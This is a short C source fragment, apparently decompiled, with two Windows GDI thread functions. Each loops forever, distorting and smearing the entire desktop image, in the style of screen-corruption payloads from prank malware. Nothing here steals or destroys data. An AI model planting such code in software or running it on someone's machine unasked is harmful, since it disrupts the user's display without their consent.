DWORD WINAPI shader12(LPVOID lpParam)
{
    HWND v3;
    HBITMAP h;
    HDC hdcSrc;
    HDC hdc;
    void* lpvBits;
    int nHeight;
    int nWidth;
    DWORD v12;
    int j;
    int v14;
    int i;
    v12 = GetTickCount();
    nWidth = GetSystemMetrics(0);
    nHeight = GetSystemMetrics(1);
    lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
    for (i = 0; ; i = (i + 1) % 2)
    {
        hdc = GetDC(0);
        hdcSrc = CreateCompatibleDC(hdc);
        h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
        SelectObject(hdcSrc, h);
        BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
        GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        v14 = 0;
        if (GetTickCount() - v12 > 0xA)
            rand();
        for (j = 0; nHeight * nWidth > j; ++j)
        {
            if (!(j % nHeight) && !(rand() % 110))
                v14 = rand() % 50;
            *((BYTE*)lpvBits + 4 * j + v14) += 10;
        }
        SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
        BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
        DeleteObject(h);
        DeleteObject(hdcSrc);
        DeleteObject(hdc);
    }
}
DWORD WINAPI invcc(LPVOID lpParam)
{
    while (1) {
        HDC hdc = GetDC(0);
        int x = SM_CXSCREEN;
        int y = SM_CYSCREEN;
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BitBlt(hdc, rand() % 666, rand() % 666, w, h, hdc, rand() % 666, rand() % 666, SRCERASE);
        Sleep(10);
    }
}